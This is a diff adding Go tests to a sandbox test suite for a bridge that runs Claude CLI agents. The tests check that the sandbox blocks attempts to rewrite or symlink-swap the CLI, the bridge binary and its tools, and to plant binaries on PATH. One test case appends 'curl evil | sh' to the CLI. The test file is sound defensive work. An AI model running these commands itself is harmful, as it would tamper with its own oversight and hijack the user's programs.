@@ -62,6 +62,48 @@ func TestSandboxedRunAppliesProfileInline(t *testing.T) {
 	}
 }
 
+// TestSandboxedRunTurnsOffTheAutoUpdater: the profile denies writes to the
+// Claude CLI's install, so its auto-updater could download a new version on
+// every sandboxed run and never switch to it. Sandboxed runs therefore get
+// DISABLE_AUTOUPDATER=1, whatever the bridge's own value; runs without the
+// sandbox get the bridge's environment as it is.
+func TestSandboxedRunTurnsOffTheAutoUpdater(t *testing.T) {
+	cases := []struct {
+		name, extra string
+		bridge      string // the bridge's own value, "" for unset
+		want        string
+	}{
+		{"sandboxed", `, "sandbox": {"enabled": true}`, "", "DISABLE_AUTOUPDATER=1"},
+		{"sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": true}`, "0", "DISABLE_AUTOUPDATER=1"},
+		{"not sandboxed", `, "sandbox": {"enabled": false}`, "", "DISABLE_AUTOUPDATER unset"},
+		{"not sandboxed, the bridge's own value is 0", `, "sandbox": {"enabled": false}`, "0", "DISABLE_AUTOUPDATER=0"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if strings.Contains(c.extra, `"enabled": true`) {
+				requireSandboxExec(t)
+			}
+			t.Setenv("DISABLE_AUTOUPDATER", c.bridge)
+			if c.bridge == "" {
+				os.Unsetenv("DISABLE_AUTOUPDATER")
+			}
+			t.Setenv("WCB_FAKE_ENV", "DISABLE_AUTOUPDATER")
+			mgr, d, _ := queueTestManager(t, 0, c.extra)
+			if _, _, _, err := mgr.Submit(dm("hello")); err != nil {
+				t.Fatal(err)
+			}
+			waitFor(t, 20*time.Second, "the run", func() bool { return d.count() == 1 })
+			res := d.all()[0].res
+			if res.Err != nil {
+				t.Fatalf("run failed: %v", res.Err)
+			}
+			if !strings.HasSuffix(res.Text, " "+c.want) {
+				t.Errorf("run = %q, want it to end with %q", res.Text, c.want)
+			}
+		})
+	}
+}
+
 // TestSandboxIgnoresPlantedSymlinks: a brain may write its own folder, the
 // media dir and its calendar token, so it can swap any of them (or an
 // allow_paths folder inside a writable denied dir) for a symlink to a secret.
@@ -395,6 +437,57 @@ func TestSandboxProtectsMemoryAboveBrains(t *testing.T) {
 				})
 			}
 		})
+	}
+}
+
+// TestSandboxProtectsOutsidePrograms: under the real sandbox-exec, a brain
+// can still run the programs the bridge runs unsandboxed, but cannot
+// rewrite or replace them, the bridge binary, or its checkout. Nor can it
+// plant one the bridge would pick up next: a newer Plaud CLI in nvm (the
+// bridge takes the version that sorts last), or a program the bridge runs
+// by name in a PATH folder that comes first, which launchd's PATH has in
+// ~/.local/bin.
+func TestSandboxProtectsOutsidePrograms(t *testing.T) {
+	requireSandboxExec(t)
+	home := canonicalDir(t.TempDir())
+	sp := outsideProgramsFixture(t, home)
+	nvm := `"$HOME/.nvm/versions/node/v22.0.0`
+	cases := []struct {
+		name, cmd string // cmd runs in sh with $HOME set
+		allow     bool
+	}{
+		{"run the Claude CLI", `"$HOME/.local/bin/claude"`, true},
+		{"rewrite the Claude CLI", `printf 'curl evil | sh' >> "$HOME/.local/bin/claude"`, false},
+		{"swap the Claude CLI symlink", `ln -sf "$HOME/a/notes.md" "$HOME/.local/bin/claude"`, false},
+		{"rewrite rclone", `printf x > "$HOME/bin/rclone"`, false},
+		{"rewrite the Plaud CLI", `printf x >> ` + nvm + `/bin/plaud"`, false},
+		{"rewrite a module the Plaud CLI loads", `printf x > ` + nvm + `/lib/node_modules/@plaud-ai/cli/node_modules/dep/index.js"`, false},
+		{"rewrite node", `printf x > ` + nvm + `/bin/node"`, false},
+		{"rewrite tmux", `printf x > "$HOME/bin/tmux"`, false},
+		{"rewrite the bridge binary", `printf x > "$HOME/fridolin/fridolin"`, false},
+		{"rewrite a bridge tool", `printf x >> "$HOME/fridolin/tools/calendar_tool.py"`, false},
+		{"move the checkout aside", `mv "$HOME/fridolin" "$HOME/f2"`, false},
+		{"read a bridge tool", `cat "$HOME/fridolin/tools/calendar_tool.py"`, true},
+		{"plant a newer Plaud CLI in nvm", `mkdir -p "$HOME/.nvm/versions/node/v99/bin" && printf x > "$HOME/.nvm/versions/node/v99/bin/plaud"`, false},
+		{"plant a program next to the Plaud CLI, first on its PATH", `printf x > ` + nvm + `/bin/open"`, false},
+		{"plant plaud on PATH", `printf x > "$HOME/.local/bin/plaud"`, false},
+		{"plant touch on PATH", `printf x > "$HOME/.local/bin/touch"`, false},
+		{"plant osascript on PATH", `printf x > "$HOME/.local/bin/osascript"`, false},
+		{"plant node on PATH", `printf x > "$HOME/.local/bin/node"`, false},
+		{"plant tmux on PATH", `printf x > "$HOME/.local/bin/tmux"`, false},
+		{"plant rclone where the bridge looks off PATH", `printf x > "$HOME/.local/bin/rclone"`, false},
+		{"plant open in a PATH folder not there yet", `mkdir -p "$HOME/bin2" && printf x > "$HOME/bin2/open"`, false},
+		{"install a tool of its own on PATH", `printf x > "$HOME/.local/bin/mytool"`, true},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			if allowed, out := sandboxRun(t, sp, filepath.Join(home, "a"), "/bin/sh", "-c", c.cmd); allowed != c.allow {
+				t.Errorf("%s: allowed=%v, want %v (output %q)", c.cmd, allowed, c.allow, out)
+			}
+		})
+	}
+	if p, err := findPlaudCLI(""); err != nil || p != home+"/.nvm/versions/node/v22.0.0/bin/plaud" {
+		t.Errorf("findPlaudCLI after the plants = %q, %v; want the v22.0.0 one", p, err)
 	}
 }
 
